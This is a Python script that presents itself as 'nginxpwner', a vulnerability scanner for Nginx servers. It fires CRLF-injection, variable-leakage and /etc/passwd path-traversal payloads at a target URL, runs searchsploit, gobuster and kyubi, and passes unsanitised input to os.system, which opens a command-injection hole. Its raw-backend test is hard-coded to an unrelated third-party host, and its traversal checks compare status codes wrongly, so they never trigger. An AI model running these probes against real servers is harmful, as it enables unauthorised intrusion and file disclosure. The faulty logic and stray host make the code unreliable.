import requests
import sys
from bs4 import BeautifulSoup
import re
from packaging import version
import os
import requests_raw
from colorama import Fore

banner='''
 _   _  _____  _____  _   _ __   ________  _    _  _   _  _____ ______
| \ | ||  __ \|_   _|| \ | |\ \ / /| ___ \| |  | || \ | ||  ___|| ___ \\
|  \| || |  \/  | |  |  \| | \ V / | |_/ /| |  | ||  \| || |__  | |_/ /
| . ` || | __   | |  | . ` | /   \ |  __/ | |/\| || . ` ||  __| |    /
| |\  || |_\ \ _| |_ | |\  |/ /^\ \| |    \  /\  /| |\  || |___ | |\ \\
\_| \_/ \____/ \___/ \_| \_/\/   \/\_|     \/  \/ \_| \_/\____/ \_| \_|

            A common vulnerability scanner for Nginx
                      Author @stark0de1'''

print(Fore.BLUE+banner)

if len(sys.argv) != 3:
    print(Fore.WHITE+"Usage: python3 nginxpwner.py https://example.com filewithexistingfolderpaths")
    sys.exit()
if sys.argv[1].endswith("/"):
    print(Fore.WHITE+"[?] Please provide the URL without the last slash")
    sys.exit()

url = sys.argv[1]
existingfolderpathlist = sys.argv[2]

basereq = requests.get(url)

nginx_version = "https://github.com/nginx/nginx/releases"
try:
  target_nginx_version = basereq.headers["Server"].split("/")[1]
except:
  print(Fore.RED+"No Server header found or invalid Server header. If you are sure that your target uses Nginx, please use nginx-pwner-no-server-header.py")
  sys.exit()
nginx_req = requests.get(nginx_version)
html=nginx_req.text
soup = BeautifulSoup(html,'lxml')
last_version =(soup.findAll('a', attrs={'href': re.compile("^/nginx/nginx/releases/tag")})[0].get('href')).split("-")[1]

if version.parse(target_nginx_version) < version.parse(last_version):
    print(Fore.RED+"[-] NGINX out of date, current version is: "+target_nginx_version+ " and last version is: "+last_version)
    print(Fore.RED+"[-] All possible exploits will be printed now:")
    os.system("searchsploit nginx "+target_nginx_version)
    print(Fore.MAGENTA+"[-] For the complete list of vulnerabilities check out: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=nginx")
else:
    print(Fore.GREEN+"[+] NGINX version is up to date")

print(Fore.BLUE+"[?] If the tool reveals the nginx.conf file this is probably because there is no root directive in the nginx.conf file. Get the contents of the file and use https://github.com/yandex/gixy to find more misconfigurations")
print(Fore.WHITE)
os.system("gobuster dir --url "+url+" -w ./nginx.txt --wildcard")
uri_crlf_test= requests.get(url+"/%0d%0aDetectify:%20clrf")
if "Detectify" in uri_crlf_test.headers:
    print(Fore.RED+"[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI")
else:
    print(Fore.GREEN+"[+] No CRLF via common misconfiguration found")

headers={"Referer": "bar"}
variable_leakage = requests.get(url+"/foo$http_referer", headers=headers)
if "foobar" in variable_leakage.text:
    print(Fore.RED+"[-] Variable leakage found in NGINX via Referer header")
    print(Fore.RED+"[-] Test other variables like $realpath_root, $nginx_version")
else:
    print(Fore.GREEN+"[+] No variable leakage misconfiguration found")
#merge-slashes set to off

merge_slashes_req = requests.get(url+"///")
merge_slashes_etc_passwd_old = requests.get(url+ "///../../../../../etc/passwd")
merge_slashes_etc_passwd = requests.get(url+ "//////../../../../../../etc/passwd")
if basereq.status_code == merge_slashes_req and basereq.text == merge_slashes_req.text:
    print(Fore.RED+"[-] Merge slashes set to off. This is useful in case we find an LFI")
if merge_slashes_etc_passwd.status_code == "200" or merge_slashes_etc_passwd_old.status_code =="200":
    print(Fore.RED+"[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
    print(Fore.RED+"[-] Try this to URIs manually: ///../../../../../etc/passwd and //////../../../../../../etc/passwd")
else:
    print(Fore.GREEN+"[+] No merge_slashes misconfigurations found")

res = requests_raw.raw(url="https://api.buckzy.remesasbam.com/", data=b"GET /? XTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
print(Fore.BLUE+"[?] Testing Raw backend reading responses, check in case the response is interesting: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#raw-backend-response-reading")
print(Fore.WHITE+res.text)
print(res.headers)
print(Fore.BLUE+"[?] If the site uses PHP check for this misconfig: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name and also check this: https://github.com/jas502n/CVE-2019-11043")

print(Fore.BLUE+"[?] Executing Kyubi to check for path traversal vulnerabilities via misconfigured NGINX alias directive"+Fore.WHITE)
pathlist = open(existingfolderpathlist, "r")
pathlines = pathlist.readlines()
for pathline in pathlines:
    os.system("kyubi "+url+"/"+pathline.strip())

